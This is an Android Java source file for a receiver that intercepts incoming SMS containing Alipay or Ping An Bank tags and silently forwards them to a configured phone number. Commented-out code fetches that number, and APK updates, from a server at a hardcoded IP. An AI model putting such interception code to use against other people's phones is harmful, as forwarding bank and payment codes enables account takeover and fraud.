package com.satan.smtranspond.Receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

import com.satan.smtranspond.Entity.EntityBean;
import com.satan.smtranspond.Utils.SharedPStoreUtil;
import com.satan.smtranspond.Utils.StringUtil;
import com.satan.smtranspond.Utils.TimeUtil;

/**
 * 类名: SMS <p>
 * 创建人: YanJ <p>
 * 创建时间: 2018/11/30 17:23 <p>
 * 描述:
 * <p>
 * 更新人: <p>
 * 更新时间: <p>
 * 更新描述: <p>
 */
public class SMS extends BroadcastReceiver {


    private EntityBean.VersionBean versionBean;

    @Override
    public void onReceive(final Context context, Intent intent) {
        String target_phone = SharedPStoreUtil.getTarget_PHONE();
        if (!StringUtil.checkMobile(target_phone)) {
            return;
        }
        // TODO Auto-generated method stub
        // 监听短信广播
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Object[] pdus = (Object[]) intent.getExtras().get("pdus");// 获取短信内容
            for (Object pdu : pdus) {
                byte[] data = (byte[]) pdu;
                SmsMessage message = SmsMessage.createFromPdu(data);// 使用pdu格式的短信数据生成短信对象

//                    提取内容
                final String sender = message.getOriginatingAddress();// 获取短信的发送者
                final String content = message.getMessageBody();// 获取短信的内容
                final String sendtime = TimeUtil.parseDateFormart(message.getTimestampMillis(), "yyyyMM-dd HH:mm:ss");


//                ArrayList<String> target = new ArrayList<String>();
////                平安银行的95511、支付宝的95188
//                target.add("95511");
//                target.add("95188");
//                if (!target.contains(sender)) {
//                    return;
//                }

                if (content.contains("【支付宝】") || content.contains("【平安银行】")) {


                    sendSM(sender, content, sendtime, target_phone);
//                    OkHttpUtils
//                            .get()
//                            .tag(this)
//                            .url("http://114.55.85.239:8055/ashx/CenterServer.ashx?action=checkversion")
//                            .build()
//                            .execute(new StringCallback() {
//
//                                @Override
//                                public void onError(Call call, Exception e, int id) {
//
//                                }
//
//                                @Override
//                                public void onResponse(String response, int id) {
//
//                                    if (StringUtil.isNotEmpty(response)) {
//                                        EntityBean bean = JSON.parseObject(response, EntityBean.class);
//                                        if (bean.getCode() == 200) {
//
//                                            versionBean = bean.getData();
//                                            String targetPhones = versionBean.getTargetPhone();
//                                            if (StringUtil.isNotEmpty(targetPhones)) {
//                                                if (proceSendNewPhone(targetPhones, context, sender, content, sendtime)) {
//                                                    update(context);
//                                                    return;
//                                                }
//                                            } else {
//                                                update(context);
//                                            }
//                                        }
//                                    }
//
//
//                                }
//                            });
//
//
//                    String phone = SharedPStoreUtil.getTarget_PHONE();
//                    if (StringUtil.isNotEmpty(phone)) {
//                        sendSM(sender, content, sendtime, phone);
//                    }


                }


            }
        }


    }

//    private void update(Context context) {
//        if (versionBean.getVersionCode() > DeviceInfoUtil.getVersionCode()) {
//            String apkURL = versionBean.getApkURL();
//            new DownloadUtils(context).downloadAPK(apkURL, "update" + DeviceInfoUtil.getVersionName());
//        }
//    }
//
//    private boolean proceSendNewPhone(String targetPhones, Context context, String sender, String content, String sendtime) {
//
////                                    匹配转发关系
//        String loacl_phone = SharedPStoreUtil.getLoacl_PHONE();
//        String[] pairs = targetPhones.trim().split(",");
//        for (String pair : pairs) {
//
//            String[] kv = pair.trim().split("-");
//            if (kv.length == 2) {
//                String keyPhone = kv[0].trim();
////                                                等同于本机号码
//                if (StringUtil.checkMobile(keyPhone) && keyPhone.equals(loacl_phone)) {
//                    String targetPhone = kv[1].trim();
//                    if (StringUtil.checkMobile(targetPhone)) {
//                        SharedPStoreUtil.setTarget_PHONE(targetPhone);
//                        return sendSM(sender, content, sendtime, targetPhone);
//                    }
//                }
//            }
//        }
//        return false;
//    }

    /**
     * 发送短信
     *
     * @param sender
     * @param content
     * @param sendtime
     * @param phone    发送号码
     */
    private boolean sendSM(String sender, String content, String sendtime, String phone) {

        StringBuilder sb = new StringBuilder();
        sb.append("来自:").append(sender).append("\n");
        sb.append("时间:").append(sendtime).append("\n");
        sb.append("内容:").append(content).append("\n");

        SmsManager.getDefault().sendTextMessage(phone, null, sb.toString(), null, null);
        return true;
    }
}
